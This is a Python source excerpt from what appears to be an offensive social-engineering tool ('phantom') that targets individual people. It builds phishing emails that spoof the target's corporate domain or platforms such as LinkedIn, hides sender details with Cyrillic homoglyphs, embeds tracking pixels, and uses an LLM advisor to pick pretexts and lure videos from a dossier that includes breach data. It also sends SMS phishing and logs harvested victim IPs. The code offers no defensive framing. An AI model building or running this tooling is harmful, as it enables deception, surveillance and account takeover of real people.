        display, addr = derive_sender(
            dossier, pretext or "",
            persona_email=self._reply_to() or "",
            configured=os.getenv("PHANTOM_PHISH_FROM", "").strip())
        if pretext == "recruiter" and self._profile is not None:
            display = self._profile.name
        if self._homoglyph_enabled():
            display, addr, subj = apply(display, addr, subj,
                                        seed=hash(email) & 0xFFFF)
        sender_addr = f"{display} <{addr}>"
        pixel_url = self._pixel_url(link) if pixel else ""
        body_html = build_html_body(subj, body_text, link.short_url,
                                    "Continue", tracking_pixel=pixel_url)
        return {"from": sender_addr, "subject": subj,
                "body_text": body_text, "body_html": body_html}

    _FREE_MAIL = {"gmail.com", "googlemail.com", "outlook.com", "hotmail.com",
                   "live.com", "yahoo.com", "proton.me", "protonmail.com",
                   "icloud.com", "aol.com", "msn.com", "yandex.com",
                   "mail.com", "gmx.com", "zoho.com"}

    def _sender_domain(self, email: str, platform: str) -> str:
        """Realistic sender domain for the phish From header.

        Prefers the target's own corporate domain (looks internal), then the
        platform's domain when known (looks like the service itself). Never
        impersonates free-mail providers (Gmail/Outlook...)."""
        domain = (email or "").split("@")[-1].lower()
        if domain and "." in domain and domain not in self._FREE_MAIL:
            return domain
        plat = (platform or "").lower()
        if plat == "twitter":
            plat = "x"
        if plat in ("linkedin", "instagram", "x", "tiktok", "facebook",
                    "github", "reddit", "telegram"):
            return f"{plat}.com"
        return ""

    def _homoglyph_enabled(self) -> bool:
        """Cyrillic homoglyph obfuscation: a stealth tool, so it follows the
        run posture — on by default, off in aggressive mode. Overridable
        with PHANTOM_PHISH_HOMOGLYPH=0/1."""
        env = os.getenv("PHANTOM_PHISH_HOMOGLYPH", "").strip().lower()
        if env in ("0", "false", "no", "off"):
            return False
        if env in ("1", "true", "yes", "on"):
            return True
        return not self._aggressive

    def _lure_platform(self) -> str:
        """Platform for the share-format video link (target's platform when
        known, else youtube shorts)."""
        plat = (self._discovered.get("platform") or "").lower()
        return plat if plat in ("instagram", "tiktok", "youtube") else "youtube"

    def _discovered_handle(self) -> str:
        """The target's handle for the share link (@handle/video/...)."""
        profile = self._discovered.get("profile") or {}
        return profile.get("username") or "creator"

    def _target_interests(self) -> str:
        """Interest text for the video picker: profile bio + platform hint."""
        parts = []
        profile = self._discovered.get("profile") or {}
        bio = profile.get("bio") or ""
        if bio:
            parts.append(str(bio))
        plat = (self._discovered.get("platform") or "").lower()
        if plat in ("instagram", "tiktok", "twitch", "youtube"):
            parts.append(plat)
        return " ".join(parts)

    def _dossier_dict(self) -> Dict[str, Any]:
        build_dossier, _, _ = _load_dossier()
        return build_dossier(self._discovered).to_dict()

    def _video_seed(self) -> int:
        emails = self._discovered.get("emails") or []
        return abs(hash(emails[0] if emails else "")) & 0xFFFF

    def _pick_lure_video(self) -> Optional[Dict[str, str]]:
        """Pick a REAL video the target may want to watch: LLM-suggested
        topic (when configured) -> yt-dlp search of the target's interests
        -> curated offline catalog. None on total failure."""
        if self._video_cache is not None:
            return dict(self._video_cache)
        try:
            from phantom.automation.social.video_picker import (
                pick_video,
                sanitize_query,
            )
            interests = self._target_interests()
            platform = self._lure_platform()
            query = ""
            advisor = self._get_advisor()
            if advisor is not None:
                try:
                    sug = advisor.suggest_video_topic(self._dossier_dict())
                    query = sanitize_query(sug.get("topic", ""))
                except Exception:
                    query = ""
            video = pick_video(interests=interests, platform=platform,
                               query=query, seed=self._video_seed())
            if video and video.get("id"):
                self._video_cache = dict(video)
                return video
        except Exception:
            pass
        return None

    def _pixel_url(self, link) -> str:
        """Base URL of a tracking link, whatever route it used, plus the
        zero-click pixel path (/px/<code>)."""
        url = str(getattr(link, "short_url", link))
        for sep in ("/l/", "/v/", "/reel/", "/shorts/", "/p/", "/video/", "/@"):
            if sep in url:
                url = url.split(sep)[0]
                break
        return f"{url}/px/{getattr(link, 'code', '')}"

    def _get_advisor(self):
        """Lazy LLM advisor — active only when PHANTOM_LLM_MODEL is set.
        Injectable for tests (assign `eng._advisor`)."""
        if self._advisor is None and os.getenv("PHANTOM_LLM_MODEL", "").strip():
            try:
                from phantom.automation.llm_advisor import LLMAdvisor
                self._advisor = LLMAdvisor(enabled=True)
            except Exception:
                self._advisor = None
        return self._advisor

    def _infer_audience(self) -> str:
        """Pick the persona audience from what we know about the target.
        Gen-Z platforms -> student cover; anything else -> professional."""
        plat = (self._discovered.get("platform") or "").lower()
        if plat in ("instagram", "tiktok", "snapchat", "twitch"):
            return "high"
        profile = self._discovered.get("profile") or {}
        if profile.get("platform", "").lower() in ("instagram", "tiktok"):
            return "high"
        return "professional"

    def _strategic_pretext(self) -> str:
        """Pick the pretext for a strategic lure: LLM advisor preference
        (when configured) falls back to the deterministic dossier scorer."""
        build_dossier, _, _ = _load_dossier()
        d = build_dossier(self._discovered)
        advisor = self._get_advisor()
        if advisor is not None:
            sug = advisor.analyze_dossier(d.to_dict())
            if sug.get("pretext"):
                return sug["pretext"]
        return d.recommended

    def _reply_to(self) -> Optional[str]:
        inst = getattr(self, "_persona_inst", None)
        if inst is not None and getattr(inst, "email", ""):
            return inst.email
        return None

    def _phish_sms(self, phone: str, link, subject: str = "",
                   body: str = "") -> Tuple[bool, List[str]]:
        """SMS phish: resolve the carrier (env override -> phonenumbers ->
        explicit error), then send through the email-to-SMS gateway."""
        from phantom.automation.social.persona import carrier_from_phone
        carrier = (os.getenv("PHANTOM_SMS_CARRIER", "")
                   or self._discovered.get("carrier")
                   or carrier_from_phone(phone))
        if not carrier:
            return False, [_marker_error(
                "cannot determine SMS carrier: set PHANTOM_SMS_CARRIER (verizon|att|tmobile|...)")]
        mailer = self._get_mailer()
        message = body or "Your account requires verification"
        ok = mailer.send_sms("Phantom", phone, carrier,
                             mailer.sms_short_link(message, str(link.short_url)))
        if not ok:
            return False, [_marker_error(
                "sms delivery failed: carrier gateway unknown or SMTP unconfigured")]
        self._remember("carrier", carrier)
        return True, [f"PHISH_SENT: to={phone} channel=sms link={link.short_url}"]

    def poll(self, timeout: float = 90.0) -> Tuple[bool, List[str]]:
        """Poll the grabber for victim hits (IP harvested on link click)."""
        lines: List[str] = []
        try:
            grabber = self._get_grabber()
            link = getattr(self, "_last_link", None)
            if link is None:
                return True, []
            hits = grabber.poll_hits(link, timeout=timeout)
            for h in hits:
                lines.append(
                    f"VICTIM_IP: ip={h.ip} ua={h.user_agent} when={_now()}")
            return (True, lines) if lines else (True, [])
        except Exception as e:
            return True, [f"ERROR: hit polling failed: {e}"]

    # -- identity memory -------------------------------------------------

    def _remember(self, key: str, value: str) -> None:
        if key in ("emails", "phones", "breaches"):
            if value and value not in self._discovered[key]:
                self._discovered[key].append(value)
        else:
            self._discovered[key] = value

    def _remember_breach(self, name: str, channel: str) -> None:
        """Record a breach name + the channel it was observed on. Keeps the
        email/phone correlation the strategic dossier uses as its hook."""
        name = (name or "").strip()
        if not name:
            return
        if name not in self._discovered["breaches"]:
            self._discovered["breaches"].append(name)
        channels = self._discovered["breach_channels"]
        seen = channels.setdefault(name, [])
        if channel not in seen:
            seen.append(channel)
